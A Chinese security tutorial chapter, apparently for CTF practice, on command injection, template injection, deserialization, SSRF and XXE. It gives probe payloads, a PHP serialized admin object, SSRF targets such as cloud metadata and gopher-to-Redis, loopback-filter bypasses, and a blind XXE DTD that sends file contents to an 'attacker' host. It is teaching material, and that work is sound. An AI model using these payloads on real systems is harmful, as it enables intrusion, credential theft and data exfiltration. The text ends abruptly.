第 09 章　执行类与借刀类：命令、模板、反序列化、SSRF、XXE

这一章是「数据变代码」的五种高级形态。共同点：服务器替你执行了你写的东西，或者替你发起了请求。

本章你会得到

  • 五种漏洞的"一句话本质"与最小验证 payload
  • 知道它们的判据为什么比别的更严格（容易假阳性）
  • 每种的常见过滤与绕法各一条

先给一张总表

漏洞本质（一句话）最小验证拿到什么
命令注入参数拼进 shell 命令;id → uid=…执行系统命令
SSTI（模板注入）参数被当成模板代码{{7*7}} → 49执行代码/读文件
反序列化可控字符串被还原成对象改 cookie 后触发报错/行为变化走 POP 链到命令执行
SSRF服务器替你去请求url=http://127.0.0.1:80 返回内网内容访问内网/云元数据
XXEXML 实体指向外部资源读 file:///etc/passwd读文件/发请求

SSTI：模板引擎把输入当成了模板

模板引擎的存在是为了"把数据和页面分开"。安全用法是"数据只是数据"； 一旦把用户输入当模板去渲染，用户就能写表达式。

// 危险写法
render_template_string("Hello " + name)     // Flask/Jinja2
$smarty->display('string:' . $_GET['t'])    // Smarty

// 探测顺序（不同引擎语法不同）
{{7*7}}         → Jinja2/Twig：49
${7*7}        → 部分引擎（需转义写）
#{7*7}        → Thymeleaf
<%= 7*7 %>      → ERB/EJS
为什么要先"算出 49"再找 RCE

因为 49 证明"表达式被执行了"，这是可计算、不可伪造的证据。 拿到这个之后再接 os.popen/subprocess 才不会白打 —— 也避免把"页面回显了 7*7 这串字符"误判成漏洞。

反序列化：字符串里的对象会被真的构造

// PHP：把用户可控的字符串反序列化
$u = unserialize(base64_decode($_COOKIE['user']));
// 攻击者构造：O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
// 服务器还原对象时可能自动触发 __wakeup / __destruct → 进入 POP 链
为什么反序列化题"看起来很难"

因为它不是"一个 payload"，而是一条链：入口对象 → 属性指向下一个对象 → 一直连到危险函数。 你要做的是读源码，把这条链画出来（工具里的 pop_chain / deser 策略做的就是这个）。 不同语言格式完全不同：PHP 是 O:4:"User"，Java 是二进制流（aced0005 开头）， Python 是 pickle，Ruby 是 Marshal —— 互相不能套用。

SSRF：借服务器的手

目标URL 形态能得到什么
本机服务http://127.0.0.1:6379（Redis）未授权访问 → 写文件/写 cron
云元数据http://169.254.169.254/latest/meta-data/临时凭证 → 接管云资源
内网后台http://10.0.0.5/admin绕过"只允许内网"的限制
gopher 打协议gopher://127.0.0.1:6379/_*1%0d%0a…构造任意 TCP 报文（Redis/MySQL/FastCGI）
为什么"黑名单挡 127.0.0.1"基本没用

因为"127.0.0.1"有很多等价写法：0177.0.0.1、2130706433、 [::1]、127.1、localtest.me（解析到 127.0.0.1）， 还可以用 302 跳转让自己的域名先被允许再跳内网。 真正的防御是白名单 + 禁止解析到内网 IP。

XXE：XML 的外部实体

除了直接读文件，盲打（页面不回显）时用"外部 DTD 两段式"把内容带出来：

# 第一段：让解析器去 load 我们的 DTD
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker/evil.dtd"> %p;]>

# evil.dtd：把文件内容拼进一个请求带出去
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % send "<!ENTITY % o SYSTEM 'http://attacker/?d=%f;'>">
%send; %o;

怎么减少误判（这一节很重要）

假阳性长什么样为什么会发生怎么排除
页面出现 49页面本来就写着 49（示例/说明）换 6*7 再测一次
回显里出现 payload服务器把输入原样反射发不可执行怪串做对照
SSRF "成功"目标把我们的 URL 存进了数据库/页面换一个不存在端口，看行为是否不同
反序列化"触发"其实只是 cookie 解析失败的报错改成合法序列化串对比报错差异
工具箱里对应什么

param_rce/cmd_filter/noalpha（命令注入与绕过滤）、 ssti/tpl_dialect（模板注入，含方言探测）、 deser/pop_chain/java_deser/pickle_rce（各语言反序列化）、 ssrf/ssrf_gopher/gopher_redis/ssrf_cloud（SSRF 系列）、 xxe/blind_xxe（XXE 含盲打）。

漏洞记这一句
